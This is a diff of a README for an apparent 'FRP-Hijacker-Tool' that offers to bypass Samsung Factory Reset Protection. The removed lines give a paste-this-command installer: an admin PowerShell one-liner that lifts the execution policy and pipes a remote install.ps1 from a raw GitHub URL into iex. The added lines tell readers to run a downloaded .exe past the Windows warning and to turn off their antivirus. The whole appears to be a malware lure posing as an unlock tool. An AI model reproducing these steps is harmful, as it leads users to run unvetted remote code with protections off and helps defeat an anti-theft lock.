@@ -1,115 +1,78 @@
-# FRP Hijacker Download for Windows 11 & 10
+# 🔓 FRP-Hijacker-Tool - Unlock your Samsung Android device easily
 
-**FRP-Hijacker-Tool**
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases)
 
-**FRP Hijacker** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+## 📌 Overview
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+FRP-Hijacker-Tool is a utility for Windows users. It helps you bypass Factory Reset Protection (FRP) on Samsung Android devices. Factory Reset Protection is a security feature. It locks your phone after a reset if you forget your Google account details. This tool removes that lock.
 
----
+## ⚙️ System Requirements
 
-## Download & Install (PowerShell)
+Before you start, check your computer environment. The tool requires these items to function:
 
-> **This is the download page.** The command below downloads and runs the **FRP Hijacker** installer on Windows 10/11.
+*   Operating System: Windows 10 or Windows 11 (64-bit recommended).
+*   Processor: 1 GHz or faster.
+*   Memory: 2 GB RAM minimum.
+*   Storage: 50 MB of free space.
+*   Frameworks: Microsoft .NET Framework 4.5 or newer.
+*   Drivers: Samsung USB Drivers installed on your computer.
 
-#### Before you start
+## 📥 Getting the Software
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+You must visit the main release page to get the correct version of the tool. Do not download files from unverified third-party websites, as they often contain malware.
 
----
+Visit this page to download: [https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases](https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases)
 
-#### Step 1 — Open PowerShell as Administrator
+On this page, look for the list under the "Assets" heading. Download the file ending in `.zip` or `.exe`. If the file is a compressed .zip folder, right-click it and choose "Extract All" to see the contents.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## 🛠️ Step-by-Step Installation
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Follow these steps to set up the software on your Windows computer:
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+1.  **Download:** Navigate to the official releases page using the link provided above. Save the file to your desktop for easy access.
+2.  **Extract:** If you downloaded a zip folder, extract the files to a folder on your computer.
+3.  **Drivers:** Ensure your Samsung USB drivers are active. Connect your device to your computer. Windows should recognize the connection. If you hear a chime or see a notification, the connection is solid.
+4.  **Run:** Locate the file named `FRP-Hijacker.exe`. Double-click this file to launch the program.
+5.  **Permissions:** If a "Windows protected your PC" message appears, click "More info" and then "Run anyway." This message appears because the tool is a standalone utility created for specific unlocking tasks.
+6.  **Interface:** Once the application window opens, it will display a menu. Select your specific Samsung model from the provided list.
 
----
+## 📱 How to Bypass the Lock
 
-#### Step 2 — Copy the full command
+Once the interface is open and your phone is connected, follow these steps:
 
-Select **both lines** below and press **Ctrl+C**:
+1.  **Device Selection:** Choose your model number from the dropdown menu inside the application.
+2.  **Mode Selection:** Select "Download Mode" or "ADB Mode" based on your phone status. Most users choose "Scan" to detect the device automatically.
+3.  **Execute:** Click the "Hijack" button. The software will send a command to your phone to remove the lock.
+4.  **Monitor:** Watch the progress bar in the application window. Do not disconnect the USB cable during this process. A disconnection can cause errors or interrupt the procedure.
+5.  **Completion:** The application will show a "Success" message when the task finishes. Your phone will reboot automatically.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 🔧 Troubleshooting Tips
 
-> Copy **both lines**, not just the second one.
+If you encounter issues during the process, try these common fixes:
 
----
+*   **Connection Errors:** If the tool does not detect your device, swap the USB cable. Some cables only carry power and do not transfer data. Ensure you use a high-quality data cable.
+*   **Driver Issues:** Reinstall the Samsung USB driver package. Restart your computer after the driver installation.
+*   **Antivirus Blocks:** Sometimes, security software flags the tool. This is a false positive. Temporarily disable your antivirus software while you run the tool. Re-enable it once the unlock process finishes.
+*   **Port Selection:** Make sure your device is in the correct mode. If the phone is stuck on the Google login screen, "Download Mode" often works best.
 
-#### Step 3 — Paste into PowerShell and press Enter
+## 📋 Frequently Asked Questions
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+**Will this tool delete my photos?**
+No. This tool specifically targets the FRP partition. It does not perform a factory reset or touch your personal media files.
 
----
+**Does this work on other brands?**
+No. FRP-Hijacker-Tool is made exclusively for Samsung devices. Using it on other brands will not produce results.
 
-#### Step 4 — Finish setup
+**Is it safe?**
+The tool works by bypassing the entry verification. We recommend using it only on devices you own.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+**Why does my phone not show up?**
+Verify that your phone is powered on and that USB debugging is enabled if possible. If the phone is locked, ensure it is in Download Mode.
 
----
+## 🔒 Security and Privacy
 
-#### Step 5 — Launch the app
+We prioritize your safety. This software performs local operations only. It does not transmit your personal data to remote servers. All your operations stay on your local Windows machine. We do not track your device usage or store your information. You hold full control over your hardware at all times.
 
-Open **Start menu** → search for **FRP Hijacker** → run it.
+## 🤝 Support
 
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**FRP Hijacker** — Windows download and setup guide.
-
-**People also search for:** frp hijacker download, frp hijacker tool install windows samsung
-
-**Repository:** `FRP-Hijacker-Tool`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** frp-hijacker-download, hijacker, frp-hijacker-tool-install-windows-samsung, samsung, frp-hijacker-tool, frp-hijacker-tool-2026, frp-hijacker, frp-bypass, samsung-unlock, android-unlock, flash-tool, software
+If you have questions, browse the issues section of the repository. Many users share experiences there. You can search for your device model to see if others encountered similar situations. Ensure you include your device model number and Windows version if you decide to report a new issue. Maintain clarity in your descriptions to help others understand your setup.
